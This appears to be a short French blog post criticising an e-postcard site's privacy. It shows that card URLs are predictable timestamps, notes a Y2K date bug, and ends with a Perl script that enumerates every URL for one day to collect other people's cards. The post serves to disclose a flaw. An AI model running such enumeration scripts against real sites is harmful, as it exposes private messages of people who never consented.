Suite à quelques amusements chez Gaston, je me suis interrogé sur la confidentialité des systèmes de e-cartes postales. Les plus connus ne sont pas des bouffons, mais les autres..

Petite recherche sur Voilà, le premier semble OK. Le deuxième me génère la carte postale suivante :
 
:======================================
Et!!! ml,
Vous avez reçu une CARTE-VIRTUEL de quelqu'un de très spécial......
Il vous suffit de cliquer sur l'url ci-dessous ou de la copier dans votre navigateur!
http://carte-virtuel.cynetek.com/stock/1010114213911.htm
Faite plaisir !!!
Envoyer une carte virtuelle !!
http://carte-virtuel.cynetek.com

======================================
Date : 101/01/14(21:39:11)
======================================
Faite plaisir !!!
Envoyer une carte virtuelle !!
http://carte-virtuel.cynetek.com

Premièrement, c'est moche et bourré de fautes orthographiques et typographiques.

Deuxièmement, le moteur a mal passé l'an 2000.

Troisièmement, l'auteur n'est pas confiant dans le succès de son site. Que se passe-t-il si deux utilisateurs envoient une carte à la même seconde ?

Quatrièmement, comme pour Gaston, la confidentialité est nulle. Voici un script perl qui ramassera sans problème toutes les cartes postées le 14 janvier 19101 :

use HTTP::Request::Common;
use LWP::UserAgent;
$ua = LWP::UserAgent->new();
for (my $i = 0; $i<24; $i++) {
  for (my $j = 0; $j<60; $j++) {
    for (my $k = 0; $k<60; $k++) {
      $url = sprintf 'http://carte-virtuel.cynetek.com/stock/1010114%02d%02d%02d.htm', $i, $j, $k;
      $response = $ua->request(GET $url);
      if ( $response -> is_success ) {
        printf "available card: %s\n", $url;
      }
    }
  }
}
